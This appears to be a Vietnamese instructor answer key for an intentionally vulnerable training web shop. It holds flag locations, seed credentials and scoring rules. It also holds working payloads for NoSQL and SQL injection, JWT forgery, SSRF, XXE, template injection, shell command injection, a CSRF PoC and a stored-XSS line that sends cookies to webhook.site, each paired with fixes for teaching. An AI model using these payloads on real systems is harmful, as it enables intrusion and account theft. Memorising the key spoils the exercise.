# TEACHER GUIDE — CyberShop Capstone (17-owasp-shop)

> ⚠️ **FILE GIÁO VIÊN — KHÔNG hiển thị học viên.** Answer key đầy đủ: mọi attack path, vị trí flag, hint progression, scoring key.
> Xem thêm `lab/README.md` (kiến trúc, sandbox, flag placement rationale).

---

## 1. Môi trường & tài khoản seed

| Thành phần | Chi tiết |
|------------|----------|
| Web | Node20/Express/EJS — host :7110, domain shop.ghedahaui.online |
| Mongo | users / orders (internal) |
| MySQL | products / reviews / **shopusers** mirror MD5 (internal) |
| flag-service | Go :8080 internal — /health /info /metrics **/flag** |
| xss-bot | Playwright, login admin, visit `/admin/reviews` mỗi 30s — nằm trên edge network, CÓ Internet egress (để exfil webhook) |

**Trang `/objectives` (student-facing):** danh sách 16 mục tiêu viết trung tính (chỉ mô tả kết quả, không nói kỹ thuật) + form nộp evidence token. Nộp đúng `FLAG{cN}` → hiện card "✓ OBJECTIVE COMPLETED" với checklist "You demonstrated..." + tên kỹ thuật + gợi ý bước tiếp theo ghi journal. Song ngữ theo cookie `lang` (mặc định vi). Chỉ validate, không lưu trạng thái — học viên tự tích bảng checklist in từ bài học.

| Email | Password | Role | Ghi chú |
|-------|----------|------|---------|
| admin@cybershop.vn | Admin#1337 | admin | secretNote = c2; apiKey sk_live_admin_9f3ac21e77 |
| demo@cybershop.vn | demo123 | customer | OTP = 1337 (in công khai trên trang login) |
| john@cybershop.vn | jordan23 | customer | **rockyou ✓** — order #1001 |
| bob@cybershop.vn | monkey | customer | **rockyou top-20** — order #1042 chứa c7 |

Mirror MySQL `shopusers` dùng cùng password → dump SQLi + hashcat -m 0 + rockyou = login được thật.

## 2. Bảng flag & vị trí (đã tách theo attack height)

> **Thiết kế student-facing:** giá trị flag đã trung tính hóa (`FLAG{cN}`) — không lộ tên kỹ thuật. Tên vuln chỉ xuất hiện SAU khi học viên nộp token tại `/objectives` (trang này in checklist "You demonstrated..." + gợi ý ghi journal). Bảng dưới là mapping nội bộ của anh/chị.

| # | Flag | Class | Milestone — học viên vừa học gì | Chạm bằng gì |
|---|------|-------|--------------------------------|--------------|
| C1 | FLAG{c1} | Info leak | Recon / content discovery / source exposure | nội dung file .bak |
| C2 | FLAG{c2} | NoSQLi | Operator injection — query semantics | field secretNote qua /auth/me |
| C3 | FLAG{c3} | JWT alg:none | Trust failure trong verify tự viết | GET /admin/api/audit |
| C4 | FLAG{c4} | Mass assignment | Server tin tưởng field client gửi | response PUT /api/profile |
| C5 | FLAG{c5} | SQLi | Injection + DB extraction (UNION → dump → crack → ATO) | row flaguser trong shopusers |
| C6 | FLAG{c6} | No rate limit | Brute-force / bounded secret space | response OTP đúng (brute 0000–9999) |
| C7 | FLAG{c7} | IDOR | Object-level authorization | note order #1042 |
| C8 | FLAG{c8} | Misconfig | Debug interface exposure | trang /debug |
| C9 | FLAG{c9} | SSRF | Internal network pivot | http://flag-service:8080/flag |
| C10 | FLAG{c10} | XXE | Parser abuse → file disclosure | file:///app/flags/c10.txt |
| C11 | FLAG{c11} | Cmd injection | Shell escape → RCE | cat /opt/scripts/netdiag.secret |
| C12 | FLAG{c12} | SSTI (EJS) | Template evaluation → code exec | đọc /app/config/session-store.key |
| C13 | FLAG{c13} | Deserialization | Gadget chain qua blob tin tưởng | fn:readFile(/app/data/state-snapshot.dat) |
| C14 | FLAG{c14} | Stored XSS | Attacker ≠ victim (bot bị đánh cắp session) | moderation key trên /admin/reviews |
| C15 | FLAG{c15} | Reflected XSS | Reflection point + browser execution | HTML comment /catalog?q= |
| C16 | FLAG{c16} | CSRF | State change không có consent | HTML comment /profile |
| Master | FLAG{owasp_shop_master} | RCE proof | Full compromise | /flag.txt |

**Discovery chain cho file-read:** robots.txt → `/.backup/` → db-seed.js.bak (creds admin + ví dụ path c10 + nhắc session-store.key). Riêng: c11 lộ trên `/debug`; c13 lộ trong header comment `src/lib/serializer.js` (CSPACK spec); master ở vị trí cổ điển `/flag.txt`.

**Chống vault:** flags emission-only nằm `/app/.state/<md5>.txt` (không đoán tên được); `/app/flags/` chỉ chứa duy nhất c10. Học viên có XXE/deser KHÔNG thu hoạch được flag của cmdi/ssti nếu không thực sự có RCE.

**Quy tắc chấm với RCE (đã chốt):** RCE không hard-wall — học viên đạt RCE được phép đọc mọi thứ, nhưng **không tự động nhận điểm các finding trước đó**. Mỗi finding chỉ tính khi có evidence độc lập (request/response riêng). Xem rubric trong missions.md.

## 3. Walkthrough từng path

### MISSION 1 — Administrative Access (4 đường)

**A. Source leak (dễ nhất, dài nhất)**
- *Bản chất (C1):* file backup chứa credential + secret để lại trong webroot, kèm **directory listing** tự bật. *Bản chất (C8):* trang debug ship lên production.
- *Phát hiện:* `robots.txt` là bản đồ — nó "Disallow" chính những chỗ nhạy cảm: `/.backup/`, `/debug`, `/admin`, `/import`. (Dạy luôn: robots.txt chỉ là lời đề nghị, nhưng dev hay dùng nó như danh sách bí mật.)
- *Payload đã verify:*
  ```bash
  curl http://localhost:7110/.backup/                 # dir listing
  curl http://localhost:7110/.backup/db-seed.js.bak   # creds admin + JWT secret fallback + moderation key + ví dụ path flag c10
  curl http://localhost:7110/debug                    # FLAG{c8} + env URLs + path netdiag.secret
  ```
- *Flag:* C1 nằm trong nội dung .bak; C8 in ngay trên /debug. Không phải đoán.
- *Fix đúng:* xóa .backup khỏi image (.dockerignore), secrets qua secret manager không comment-in-code, debug gate theo env `NODE_ENV`. Fix sai: đổi tên thư mục cho "khó đoán".

**B. NoSQL Injection (nhanh nhất)** — nhận ra: form login cũng nhận JSON (Burp: Change Request Method / Content-Type)
```http
POST /login
Content-Type: application/json

{"email":{"$ne":null},"password":{"$ne":null}}
```
→ 200 + token admin (findOne trả user đầu tiên = admin). Biến thể blind extract khi không thấy response: `{"email":{"$regex":"^admin"},"password":{"$regex":"^A"}}` đoán từng ký tự. Sau bypass: `GET /auth/me` → `secretNote` = **C2**.

**C. JWT alg:none** — nhận ra: decode cookie `token` (base64url, 3 phần), header nói alg HS256 nhưng server tự viết verify
```bash
H=$(printf '{"alg":"none","typ":"JWT"}'|base64 -w0|tr '+/' '-_'|tr -d '=')
P=$(printf '{"id":"admin@cybershop.vn","name":"Administrator","role":"admin","exp":9999999999}'|base64 -w0|tr '+/' '-_'|tr -d '=')
curl -H "Cookie: token=$H.$P." http://localhost:7110/admin/api/audit   # chú ý dấu chấm cuối = signature rỗng
```
→ **C3**. (Biến thể path A: crack HS256 bằng secret `cybershop-secret-2024` leak từ .bak — jwt-tools/hashcat -m 16500.)

**D. Mass Assignment** — nhận ra: PUT /api/profile echo lại toàn bộ doc; thử thêm field lạ
```http
PUT /api/profile        (cookie của demo)
Content-Type: application/json

{"role":"admin"}
```
→ response chứa `"role":"admin"` + `extended.flag` = **C4**. Nav hiện mục Admin. *Root cause: `$set: req.body` không whitelist field.*

**C6 — OTP không rate limit (hỗ trợ M1)**
- *Bản chất:* endpoint verify OTP không có bộ đếm lần thử, không lockout, không delay → mã 4 số = tối đa 10.000 request là chắc chắn đúng.
- *Phát hiện:* trang `/auth/otp` (in công khai demo account + OTP=1337 để học viên nhanh vào app — xem mục 4b số 5 nếu muốn bắt brute-force thật).
- *Payload:* Burp Intruder / ffuf dò `code` từ 0000–9999 trên `POST /auth/otp-verify`; response khác biệt ở "OTP verified".
- *Flag:* response thành công trả thẳng **FLAG{c6}**.
- *Fix đúng:* rate limit theo IP+account, lockout tạm thời, OTP hết hạn 60s, tối đa 5 lần thử.

### MISSION 2 — Broken Access Control

**IDOR (C7)**
- *Bản chất:* route `GET /orders/:id` chỉ check "đã đăng nhập", KHÔNG check `owner`. Query là `findOne({id})` — thiếu điều kiện sở hữu.
- *Phát hiện:* đăng nhập john → `/orders` thấy đơn của mình (#1001) → mutate ID (Intruder fuzz 1000–1100).
- *Payload đã verify:* `GET /orders/1042` với cookie john → HTTP 200, đơn của bob, note chứa **FLAG{c7}**.
- *Fix đúng:* `findOne({ id, owner: req.user.id })` — object-level authorization ngay trong query. Fix sai: đổi ID sang UUID (vẫn IDOR nếu lộ), ẩn link.

**Function-level authz missing (hỗ trợ M2)**
- *Bản chất:* `/api/admin/users` chỉ có `requireAuth`, không check role — endpoint quản trị dùng được bởi customer thường.
- *Phát hiện:* response tự nhắc `"authz pending (TICKET-4021)"` — in-universe hint.
- *Trả về:* toàn bộ Mongo users + **MD5 hash MySQL** → nối sang crack path.
- *Fix đúng:* middleware `requireAdmin` ở mọi route quản trị; deny-by-default.

**SQL Injection (C5) — card đầy đủ**
- *Bản chất:* input nối thẳng vào chuỗi truy vấn:
  ```js
  pool.query(`SELECT id,name,price,short_desc FROM products WHERE name LIKE '%${q}%' OR short_desc LIKE '%${q}%'`)
  ```
  Input được hiểu là **cú pháp SQL**, không phải dữ liệu. Đây là dạng thứ hai của "data biến thành code" (giống SSTI/deser — dạy liên kết chéo).
- *Phát hiện:* ô search → thử ký tự `'` → **verbose SQL error** (chủ ý bật) lộ cấu trúc query. Đọc error = recon nội bộ DB.
- *Payload tautology (đã verify):* `' OR 1=1-- -` hoặc `' OR 1=1#` → trả về cả 11 sản phẩm thay vì kết quả search.
  - ⚠️ **Quirk MySQL:** `' OR '1'='1'--` FAIL vì template nối thêm `%` ngay sau input (`'1'='1'--%`) mà MySQL yêu cầu **space sau `--`** mới coi là comment. Học viên thấy error cắt đúng tại `--%` là tự rút ra quy tắc.
- *Payload UNION (đã verify):*
  ```
  ' UNION SELECT 1,CONCAT(email,0x3a,password_hash),role,'x' FROM shopusers-- -
  ```
  - Đếm cột: SELECT gốc có **4 cột** → UNION phải đúng 4.
  - ⚠️ **Gotcha kiểu dữ liệu:** đặt hash vào cột `price` (DECIMAL) sẽ bị coerce thành 0 mất dữ liệu → phải đưa vào cột VARCHAR (`name`). Lỗi kinh điển khi viết UNION injection.
  - *Mapping cột thực tế (đã verify):* col2 = tên sản phẩm (`<h3>`), col3 = price DECIMAL, col1 = short_desc. Biến thể tối giản chạy tốt: `' UNION SELECT email,password_hash,1,1 FROM shopusers#`. Lưu ý tên cột là `password_hash` (không phải `password` — error sẽ tự dạy).
- *Kết quả:* đủ 5 row, trong đó `flaguser@cybershop.vn:FLAG{c5}` = **C5**, kèm MD5 của admin/demo/john(jordan23)/bob(monkey).
- *Biến thể khác chạy được:* error-based (`extractvalue`/`GROUP BY` duplicate) và blind boolean (so sánh số sản phẩm trả về giữa TRUE/FALSE).
- *Flag nằm đâu mà biết:* bảng `shopusers` có row `flaguser` — học viên dump hết bảng là thấy; không cần đoán đường dẫn file.
- *Fix đúng:* parameterized query `pool.query('...LIKE ?', ['%'+q+'%'])`; ORM binding. Fix sai: filter ký tự `'` (bypass bằng hex/charcode), WAF-only.
- *Điểm dạy nối dài:* MD5 không salt → crack rockyou (jordan23, monkey) → login tài khoản người khác thật = account takeover. Nối sang phụ lục nhận diện hash (mục 6).

> 💡 **Teaching moment — MySQL comment quirk:** payload `' OR '1'='1'--` sẽ FAIL với syntax error vì template nối thêm `%` ngay sau input (`'1'='1'--%`) mà MySQL **yêu cầu space sau `--`** mới coi là comment. Học viên đọc verbose error (chủ ý bật) sẽ tự thấy điểm cắt `--%`. Payload đúng: `' OR 1=1-- -`, `' OR 1=1#`, hoặc UNION với `-- -`. Đây là chỗ tốt để dạy "đọc error message = recon nội bộ DB".

### MISSION 3 — Internal Pivot

**SSRF (C9)**
- *Bản chất:* server **fetch URL do user kiểm soát** (`fetch(url)` trong `/profile/avatar`) và trả preview 500 ký tự. Server đứng trong mạng nội bộ nên chạm được service mà browser không thấy.
- *Phát hiện:* form "Avatar URL" trên trang profile — feature server-tải-hộ là dấu hiệu SSRF kinh điển.
- *Payload đã verify:* `POST /profile/avatar {"url":"http://flag-service:8080/flag"}` → preview chứa **FLAG{c9}**. Enumerate thêm `/info`, `/metrics`, `/health` (tên host `flag-service` lấy từ trang `/debug`).
- *Fix đúng:* egress allowlist (chỉ domain ngoài cho phép), block dải nội bộ (RFC1918/link-local), cố định scheme http(s). Fix sai: blacklist từng URL cụ thể.

**XXE (C10)**
- *Bản chất:* parser XML cho phép định nghĩa **external entity** trong DOCTYPE — khi gặp `&x;` nó tự đọc tài nguyên từ SYSTEM URI. Data của file hệ thống chảy vào XML.
- *Phát hiện:* `robots.txt` (`Disallow: /import`) hoặc link ở admin dashboard → form nhận XML body → `POST /import/xml`.
- *Payload đã verify:*
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE r [<!ENTITY x SYSTEM "file:///app/flags/c10.txt">]>
  <products><product><name>&x;</name><price>1</price></product></products>
  ```
  → khung "Parser output" hiện **FLAG{c10}**.
- *Flag nằm đâu mà biết:* ví dụ path trong `/.backup/db-seed.js.bak` (path A đã dẫn tới).
- *Điểm dạy:* entity `http://` bị chặn ("egress filter") — boundary vẫn còn, chỉ `file://` đi qua; phân biệt SSRF (server fetch URL) vs XXE (parser đọc file cục bộ).
- *Fix đúng:* tắt DTD/entities hoàn toàn (`libxml2 --noent` OFF, parser config disallow DOCTYPE).
- *Lưu ý vận hành:* import ghi vào bảng staging `imported_products` (moderation queue) — catalog công khai KHÔNG bị bẩn khi học viên test, không lộ đáp án chéo giữa các session.

### MISSION 4 — Code Execution

- **SSTI (hiện tại KHÔNG cần đăng nhập — xem mục 4b số 1):** link "Invoice template" ở trang hóa đơn; param `tpl` vào thẳng `ejs.render`:
```bash
curl -G --data-urlencode 'tpl=<%= global.process.mainModule.require("fs").readFileSync("/app/config/session-store.key","utf8") %>' \
     http://localhost:7110/invoice/1001
```
→ **C12**. Đổi path thành `/flag.txt` = master flag. Payload nhận diện: `<%= 7*7 %>` ra 49 là confirm template exec.
- *Điểm dạy hay (đã verify):* `<%= require(...)%>` **FAIL** với "require is not defined" — EJS compile bằng `new Function` nên không thấy module scope; phải đi vòng qua `global.process.mainModule.require`. Học viên gặp error này là bài học về sandbox không tồn tại.
- **Command Injection (cần admin):** form Network Diagnostics; sink `exec('sh -c "getent hosts ${target}..."')`:
```bash
curl -H "Cookie: <admin-token>" --data-urlencode 'target=x; cat /opt/scripts/netdiag.secret' \
     http://localhost:7110/admin/tools/diag   # = C11
# target=x; id            -> uid=1000(node) — containment proof
# target=x; cat /flag.txt -> FLAG{owasp_shop_master}
```
- **Deserialization:** cookie `shop_state` = base64 CSPACK v1; gadget `fn:readFile(/app/data/state-snapshot.dat)` → output hiện ở footer đỏ = **C13**.

> 💡 **Giảng giải bản chất C13 (nên chiếu lên lớp):**
> - *"Tin tưởng cookie" chỉ là điều kiện cần — chưa đủ. Lỗ hổng chỉ phát sinh khi format serialize cho phép nhúng **HÀNH VI** (`fn:<op>(<arg>)`) và server **THỰC THI** op đó lúc hydrate. Data biến thành code.*
> - **Gadget** = code có sẵn trong app, vô hại khi dùng đúng chỗ, bị attacker lợi dụng: `readFile` = primitive đọc file; footer `state-debug` = sink hiển thị kết quả. Thực tế (Java ysoserial, PHP POP chain) gadget chain nối thành RCE đầy đủ — lab giới hạn readFile/echo để dạy khái niệm.
> - **So sánh PHP (học viên sẽ hỏi):** `O:4:"User":1:{s:4:"role";...}` của `serialize()` cũng là plaintext sửa được — attacker đổi class/thuộc tính rồi đưa lại cho `unserialize()`, magic methods (`__wakeup`/`__destruct`) tự trigger = POP chain. CSPACK `fn:` là bản mini của cơ chế đó. Cùng họ: Java `readObject()` (ysoserial), Python `pickle` (RCE tức thì). PHP 7 thêm `allowed_classes` chính để chống cái này.
> - Công thức nhận diện: `input chứa metadata hành vi? + server thực thi theo metadata? + nguồn untrusted?` → Insecure Deserialization.
> - Remediation ĐÚNG: format data-only (JSON + schema validation); bắt buộc native thì HMAC-sign + allowlist class. Fix SAI: filter tên op trong payload (luôn bypass được).
> - **Discovery chain (đã verify):** visit lần đầu → server SET cookie `shop_state=Y2FydD1zOmVtcHR5...` → học viên decode base64 trong devtools → thấy format `key=s:value;` → đọc spec (hint M4 hoặc source) → chế gadget `fn:`.

### Client-side

**Reflected XSS (C15)**
- *Bản chất:* input được echo thẳng vào HTML bằng `<%- %>` (raw output) tại heading kết quả search; sink thứ hai `GET /login?msg=`.
- *Phát hiện:* view-source thấy marker `<!-- FLAG{c15} -->` ngay cạnh điểm render → gợi ý test raw output.
- *Payload đã verify:* `/catalog?q=<svg onload=alert(1)>` → script tag nguyên vẹn trong DOM.
- *Fix đúng:* `<%= %>` (auto-escape) cho mọi output; encoding theo context (HTML/attr/JS/URL); CSP làm lớp phụ.

**Self-XSS (không có flag — card dạy học)**
- *Bản chất:* bio profile render raw (`<%- profile.bio %>`) nhưng **chỉ chủ tài khoản nhìn thấy** → payload chỉ XSS chính mình.
- *Điểm dạy:* phân biệt self vs stored vs reflected; self-XSS riêng rẻ impact ~0, nguy hiểm khi chain với CSRF/login-CSRF lỡ nạn nhân dán payload vào phiên của họ.

**Stored XSS (C14)**
- *Bản chất:* review lưu DB nguyên văn, render raw ở `/product/:id` VÀ `/admin/reviews` — trang mà **xss-bot (admin giả lập)** visit mỗi 30s. Nạn nhân là admin, không phải bạn. Cookie `token` là HttpOnly (không đọc được bằng `document.cookie`) NHƯNG server set kèm cookie **`moderation_key=FLAG{c14}` không HttpOnly khi admin login** ("legacy console cache") → cookie-theft có đồ mà lấy.
- *Sơ đồ flow:*
  ```
  Học viên trồng <script> vào REVIEW SẢN PHẨM (/product/<id>/review)
        ↓ lưu RAW vào MySQL (không sanitize)
  BOT ADMIN login + vào /admin/reviews mỗi 30s (bot có Internet egress)
        ↓ script CHẠY TRONG BROWSER CỦA ADMIN — attacker ≠ victim
  document.cookie chứa moderation_key=FLAG{c14} (token thì HttpOnly!)
        ↓ exfil về COLLECTOR CỦA HỌC VIÊN (webhook.site/...)
  Học viên mở inbox webhook của mình → nhận cookie + flag
  ```
- *Phát hiện:* form review không sanitize (thử `<b>test</b>` in đậm thật); missions hint nhắc bot đọc review định kỳ; decode cookie của chính mình sau khi login admin thấy `moderation_key`.
- *Payload mẫu (đã verify cơ chế — thay UUID webhook của học viên):*
  ```html
  <script>new Image().src="https://webhook.site/<uuid>?c="+encodeURIComponent(document.cookie)</script>
  ```
  hoặc fetch với encodeURIComponent. → chờ tối đa ~40s (chu kỳ bot 30s + 8s giữ trang) → inbox webhook hiện `moderation_key=FLAG{c14}; shop_state=...`. Lỗi dạy kèm: quên encodeURIComponent mất dấu `&`/`+`; dùng https cho trang https (mixed content chặn http).
- *Smoke test:* `WITH_BOT=1 ./smoke-test.sh` tự trồng payload exfil về collector local (python http.server trên gateway của mạng edge) và khẳng định cookie chứa moderation_key đến nơi.
- *Fix đúng:* escape khi render, sanitize-html khi lưu, CSP `script-src 'self'`, HttpOnly cho MỌI cookie nhạy cảm (không chỉ token), SameSite.

**CSRF (C16)**
- *Bản chất:* `POST /profile/password` đổi mật khẩu KHÔNG có CSRF token, cookie không SameSite, không check Origin/Referer → site ngoài có thể ép browser nạn nhân (đang đăng nhập) gửi request.
- *Phát hiện:* marker `<!-- FLAG{c16} -->` trong HTML /profile; Burp: "Engagement tools → Find CSRF" hoặc quan sát form thiếu token.
- *PoC khai thác (evidence nên nộp):*
  ```html
  <form method="POST" action="https://shop.ghedahaui.online/profile/password" id=f>
    <input name="password" value="hacked123"></form>
  <script>document.getElementById('f').submit()</script>
  ```
  Nạn nhân mở trang này (đang login) → mật khẩu bị đổi = account takeover.
- *Fix đúng:* CSRF token per-session + `SameSite=Lax/Strict` + verify Origin header. Fix sai: check Referer duy nhất (bypass được).

## 4. Scoring key (đối sánh khi chấm)

| Nhóm | Điểm | Giáo viên nhìn gì |
|------|------|-------------------|
| Recon | 10 | Danh sách endpoint/.backup//debug/robots — có map attack surface |
| Hypothesis & Validation | 20 | Burp history: mutate → compare → validate (không phải spray payload ngẫu nhiên) |
| Exploitation | 20 | Root cause mỗi finding (vì sao dính — code-level), không chỉ screenshot flag |
| Chaining | 20 | Tối thiểu 1 chain ≥ 3 mắt (VD: .bak→creds→login→mass-assign→diag→RCE→/flag.txt) |
| Post-Exploit Impact | 15 | Data đọc được: hash dump, apiKey, secretNote, moderation key, pivot nội bộ |
| Report & Remediation | 15 | Fix ĐÚNG (parameterized query, object-level authz, egress allowlist...) — WAF-only = trừ điểm |

**Red flag khi chấm:** nộp >80% flag nhưng không giải thích được root cause từng finding → tối đa 40/100. Đây là điểm khác biệt của capstone này.

## 4b. Các điểm thiết kế — ✅ ĐÃ CHỐT (quyết định của anh, phiên họp review)

1. **SSTI không cần đăng nhập** → **GIỮ NGUYÊN (guest vẫn dùng được).** Capstone không phải linear CTF: học viên đang recon mà tình cờ thấy `/invoice/1001?tpl=` rồi `<%= 7*7 %>` → `49` là một aha-moment đúng kiểu discovery mình muốn dạy ("cái này không phải parameter bình thường — server đang execute template của mình"). Không ép login → admin → SSTI.

2. **RCE = đọc được source = bẻ được hết** → **KHÔNG hard-wall. Để nguyên.** Đây là thực tế: một primitive RCE có impact lớn hơn nhiều so với một flag riêng lẻ — và đó là bài học. Chống ăn điểm bằng **scoring rule**: RCE cho điểm M4 + Post-Exploit Impact, nhưng KHÔNG tự động tính điểm các finding C1–C13; từng finding phải có evidence độc lập. Đã ghi vào missions.md (mục M4) và mục 2.

3. **Instance dùng chung lộ đáp án chéo** → reviews stored XSS lưu chung → payload A chạy trong browser B. Giữ khuyến nghị **1 stack compose / 1 học viên hoặc nhóm**, reset sau session. Platform spin per-session thì không vấn đề.

4. **Thời lượng** → `lab_duration = 7200` (2h) làm trần platform; pedagogy chia **3 session × 60–90 phút**: (S1) Recon + M1 + M2 · (S2) M3 + M4 · (S3) free play + chaining + report. Junior yếu vẫn hoàn thành 3–5 finding; khá thì chain; mạnh phá nát app — một lab phục vụ cả ba mức, không cần 3 bản difficulty.

5. **OTP demo in công khai trên trang login** (`demo@cybershop.vn / demo123`, OTP=1337) → **giữ**, vì mục đích chính là giảm friction vào app. Muốn chấm brute-force thật: yêu cầu evidence Intruder/ffuf trên mã khác, hoặc anh xoá hint khi ra đề riêng bài rate-limit.

6. **Đồng bộ password seed Mongo ↔ MySQL** — `jordan23`/`monkey` phải khớp ở cả `config/db.js` lẫn `seed/schema.sql`. Sửa một chỗ quên chỗ kia → path crack sẽ login fail (đã dính và sửa rồi). Có trong checklist bảo trì.

7. **XXE parser là mô phỏng regex**, không phải libxml2 thật — hỗ trợ general entity + file://, KHÔNG hỗ trợ parameter entity, external DTD, hay fetch http. Đủ để dạy XXE cơ bản; nếu muốn dạy nâng cao (OOB via FTP/DNS) phải thay bằng parser thật.

8. **Trùng lặp path A:** JWT fallback secret nằm ngay trong `.bak` mà path A đã leak → học viên path A có thể forge HS256 luôn mà không cần alg:none. Không sao về pedagogy (nhiều đường vẫn tốt), nhưng khi chấm chain nhớ chấp nhận cả hai biến thể.

9. **C15/C16 chỉ là marker discovery** → **CHÍNH THỨC: chấm qua evidence, không nhét flag độc lập.** CSRF PoC đổi password thành công / stored XSS exfil về collector đã là exploit hoàn chỉnh. Không tạo flag chỉ để "có flag" — sẽ dạy sai tư duy "không có flag = không quan trọng". Rubric đã ghi rõ.

## 5. Hint progression (đọc cho học viên khi bí)

Chỉ dùng khi học viên đã thử và bế tắc — không nói trước:
1. *"Recon kỹ. Deploy xong thường để lại đồ."*
2. *"Login nhận cả JSON. NoSQL xử lý object khác SQL."*
3. *"Token 3 phần. Phần giữa nói bạn là ai — ai ký nó?"*
4. *"Server $set toàn bộ body bạn gửi lên profile."*
5. *"ID trong URL dễ đoán. Server check ownership chưa?"*
6. *"Có feature server tải URL giúp bạn. Nó đứng ở mạng nào?"*
7. *"Template string là code. Ai render nó?"*
8. *"Cookie shop_state: format spec nằm ngay trong source."*
9. *"Review của bạn được AI... à nhầm, admin bot đọc định kỳ."*

## 6. Phụ lục: Dạy nhận diện mã hóa / hash (kỹ năng nền)

Học viên sẽ gặp ngay trong lab này: dump SQLi ra **MD5** → phải nhận diện + crack. Dạy theo thứ tự *quan sát trước, tên gọi sau* — đúng triết lý discrepancy của khóa.

### 6.1 Bảng pattern nhận diện nhanh (dạy học viên tự trả lời 3 câu hỏi)

> Luôn hỏi: **(1) Charset gì? (2) Độ dài bao nhiêu? (3) Có cấu trúc/vết không?**

| Nhìn thấy | Suy ra | Cách xử lý |
|-----------|--------|------------|
| Chỉ `0` và `1`, nhóm 8 bit | Binary text | chia nhóm 8 → ASCII |
| `0-9a-f`, độ dài chẵn | Hex-encoded | decode hex → xem có phải text không |
| Hex **đúng 32 ký tự** | **MD5** | one-way! chỉ brute/rainbow, KHÔNG "giải mã" được |
| Hex đúng 40 / 64 ký tự | SHA-1 / SHA-256 | same — brute/rainbow |
| `A-Za-z0-9+/` + đuôi `=` hoặc `==`, dài chia hết 4 | Base64 | decode; hay lồng nhiều lớp |
| Bắt đầu bằng `eyJ...` | Base64 của JSON (`{"`) | gần như chắc chắn là JWT/header token → decode phần giữa |
| `A-Z2-7=` | Base32 | decode |
| `%20%3Csvg...` | URL-encoding | percent-decode |
| Vẫn đọc được như tiếng "lệch" | ROT13/Caesar | thử shift 1–25 |
| Nhiều lớp xen kẽ | Multi-layer | CyberChef "Magic" |

**Câu thần chú cho lớp:** *"Hash ≠ encoding."* Base64/hex/binary là **mã hóa hai chiều** (decode được); MD5/SHA là **one-way** — cái gọi là "crack MD5" thực chất là brute-force wordlist/rainbow table, không phải giải mã.

### 6.2 Bộ công cụ giới thiệu (từ nhẹ đến pro)

| Tool | Loại | Dùng khi |
|------|------|----------|
| **CyberChef** (gchq.github.io/CyberChef) | web, kéo-thả, tải về chạy offline được | công cụ chính — op **"Magic"** tự nhận diện + decode chuỗi lạ |
| **dcode.fr/cipher-identifier**, boxentriq | web | đoán cipher cổ điển (caesar/vigenère...) |
| **hashid** / hash-identifier | CLI: `hashid '<chuỗi>'` | đoán họ hash từ độ dài/format |
| **name-that-hash** (`nth`) | CLI, chính xác hơn, map sẵn sang mode hashcat | cần biết `-m` số mấy để crack |
| **hashcat -m 0 -a 0 dump.txt rockyou.txt** / john | CLI | crack MD5 thật; dạy luôn `--show` |
| md5decrypt.net, crackstation.net | web | tra rainbow cho hash phổ biến KHÔNG salt (nói rõ: chỉ dùng cho hash yếu, mục đích học) |

### 6.3 Flow dạy trên lớp (15–20 phút)

1. **Chiếu 5 chuỗi mẫu, cho lớp phân loại bằng 3 câu hỏi ở 6.1** (không nói tên trước):
   ```
   aGVsbG8=                              → base64("hello")
   68656c6c6f                            → hex("hello")
   01101000 01101001                     → binary("hi")
   d0763edaa9d9bd2a9516280e9044d885      → MD5("monkey") ← chính là hash bob trong lab này!
   a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 → SHA-1("test")
   ```
2. **CyberChef Magic**: dán từng chuỗi → xem tool tự nhận — chốt lại quy luật charset/độ dài.
3. **Chuyển sang hashid/nth** với 2 chuỗi hash → chỉ ra output nối thẳng sang hashcat mode.
4. **Crack thật** `d0763edaa9d9bd2a9516280e9044d885` bằng rockyou → ra `monkey` → nói: *"trong lab capstone, các anh chị sẽ tự dump được bảng hash này qua SQLi — ai nhớ payload không?"* (kéo nối vào C5).
5. **Nhấn mạnh ranh giới pháp lý/đạo đức:** crack hash chỉ trong môi trường lab/scope được phép.

### 6.4 Bài tập về nhà gợi ý

Cho file 10 chuỗi trộn lẫn (base64 lồng hex, MD5 phổ biến trong rockyou, binary, ROT13) — yêu cầu: bảng phân loại + tool đã dùng + plaintext. Chấm theo *quy trình*, không chấm kết quả đúng duy nhất.

## 7. Bảo trì

- Reset: `./reset.sh` (down -v + up --build + wait health ~60s)
- **Smoke test sau mọi thay đổi:** `cd lab && ./smoke-test.sh` (~15s, 18 check) hoặc `WITH_BOT=1 ./smoke-test.sh` (kèm C14 qua bot, +60s). Trỏ host khác: `./smoke-test.sh https://shop.ghedahaui.online`. Exit code 0 = tất cả PASS.
- Kiểm tra bot sống: `docker compose logs xss-bot` phải thấy `[bot] visited /admin/reviews`
- Nếu sửa src: `docker compose up -d --build web`
- Đã sửa (phiên review): bug thứ tự middleware làm nav/user luôn null trong view; invoice-default thiếu locals `t` gây crash server (async rejection); thêm `restart: unless-stopped` cho web.
- Sandbox audit checklist: xem `lab/README.md`
